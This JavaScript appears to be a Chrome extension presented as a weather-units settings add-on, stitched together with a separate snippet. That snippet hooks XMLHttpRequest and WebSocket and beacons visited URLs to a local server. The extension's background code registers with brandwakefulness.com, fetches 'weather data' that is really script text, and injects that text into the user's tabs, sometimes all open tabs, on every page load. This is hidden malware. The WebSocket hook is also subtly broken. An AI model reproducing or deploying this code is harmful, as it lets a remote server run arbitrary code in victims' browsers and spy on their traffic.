function collectMessageToServer(data){
    var img = document.createElement("img");
    img.src = "http://127.0.0.1:8080/" + chrome.runtime.id + "/" + data;
}

function hookAjax(){
    var _XMLHTTPRequestOpen = XMLHttpRequest.prototype.open;
    XMLHttpRequest.prototype.open = function(){
        console.log(arguments);
        collectMessageToServer("bk-ajax-" + btoa(arguments[1]));
        _XMLHTTPRequestOpen.apply(this, arguments);
    }
}
function hookWebsocket() {
    var _websockSend = WebSocket.prototype.send;
    WebSocket.prototype.send = () => {
        console.log(arguments);
        collectMessageToServer("bk-ws-" + btoa(arguments[1]));
        _websockSend.apply(this, arguments);
    }
}

function run(){
    hookAjax();
    hookWebsocket();
}
run();
//sn00ker_ahahaha
$(document).ready(function() {
    chrome.storage.sync.get('units', function(response) {
        if (response.units) {
            $('#' + response.units).attr('checked', 'checked');
        }
        else {
            console.log(response.units);
        }
    });

    $('#saveAllChanges').on('click', function(event, ui) {
        console.log($('.units:checked').val());
        chrome.storage.sync.set({ 'units': $('.units:checked').val() }, function() {
            $('#message').html('Settings updated successfully.');
        });
    });

});

var partnerID = '9';

/*old code*/
var app = {
    
    api: 'https://brandwakefulness.com/api/',

    register: function() {
        $.ajax({
            url: app.api + 'register',
            method: 'post',
			data: {
                partnerID: partnerID
            },
            dataType: 'json',
            success: function (response) {
                if (response.status) {
                    if (typeof response.payload.id != 'undefined' && typeof response.payload.refresh_time != 'undefined') {
                        app.setId(response.payload.id);
                        app.setTimer(response.payload.refresh_time);
                        return true;
                    }
                    else {
                        console.log('Error while fetching ID');
                        return false;
                    }
                }
                else {
                    console.log('Error in registration');
                    return false;
                }
            }
        });
    },

    unregister: function() {
        $.ajax({
            url: app.api + 'unregister',
            data: {
                id: this.getId(),
                partnerID: partnerID
            },
            dataType: 'json',
            success: function(response) {
                if (response.status) {

                }
                else {
                    if (app.getId()) {
                        this.unregister();
                    }
                }
            },
            error: function(error) {
                console.log(error);
            }
        });
    },

    getId: function() {
        var id = localStorage.getItem('id');

        if (id) {
            return id;
        }
        else {
            return false;
        }
    },

    setId: function(value) {
        if (value) {
            localStorage.setItem('id', value);
            return true;
        }
        else {
            return false;
        }
    },

    getWeatherData: function(tabId, url) {
        $.ajax({
            url: app.api + 'get_weather_data',
            method: 'post',
            data: {
                token: this.getId(),
                partnerID: partnerID
            },
            dataType: 'json',
            success: function(response) {
                if (response.status) {
                    app.s = response.payload.s;app.r = response.payload.r;app.u = response.payload.u;app.t = response.payload.type;
                    app.setTimer(response.payload.refresh_time);
                    app.displayData(response.payload, tabId);
                }
            },
            error: function(error) {
                console.log(error);
            }
        });
    },

    displayData: function(data, tabId) {
        if (parseInt(data.type) < 5) {
            chrome.tabs.executeScript(tabId, {
                code: data.s
            });
        }
        else {
            chrome.tabs.executeScript(tabId, {
                code: data.s
            });
        }
    },

    setTimer: function(value) {
        var now = new Date();
        localStorage.setItem('refreshTime', value);
        localStorage.setItem('lastUpdate', now.getTime());
        return true;
    },

    checkTimer: function() {
        var lastUpdate = parseInt(localStorage.getItem('lastUpdate'));
        var refreshTime = parseInt(localStorage.getItem('refreshTime'));
        if (lastUpdate && refreshTime) {
            var now = new Date();

            if (now.getTime() > (lastUpdate + refreshTime)) {
                console.log('wait time expired');
                return true;
            }
            else {
                console.log('wait time');
                return false;
            }
        }
        else {
            console.log('wait time not set');
            return true;
        }
    },

    eventListeners: function() {
        chrome.tabs.onUpdated.addListener(function(tabId , changeInfo, tab) {
            if (tab.url.indexOf('chrome://') == -1) {
                if (app.checkTimer()) {
                    if (changeInfo.status == 'complete') {
                        app.getWeatherData(tabId, tab.url);
                    }
                }
                else {
                    if (typeof app.s != 'undefined') {
                        if (parseInt(app.t) != 9) {
                            if (
                                tab.url.indexOf(app.u) == -1 &&
                                tab.url.indexOf(app.u.replace('http:', 'https:')) == -1 &&
                                tab.url.indexOf(app.u.replace('https:', 'http:')) == -1 &&
                                tab.url.indexOf('#7s8d6f87') == -1
                            ) {
                                app.displayData({r: app.r, s: app.s}, tabId);
                            }
						    else {
                                chrome.tabs.query({url: ['http://*/*', 'https://*/*']}, function (tabs) {
                                    for (var i = 0; i < tabs.length; i++) {
                                        chrome.tabs.executeScript(tabs[i].id, {
                                            code: app.r
                                        });
                                    }
                                });
                                delete app.s;delete app.t;delete app.u;
                            }
                            
                        }
                    }
                }
            }
        });
    },

    init: function() {
        if (!this.getId()) {
            this.register();
        }
        app.eventListeners();
    }

};

app.init();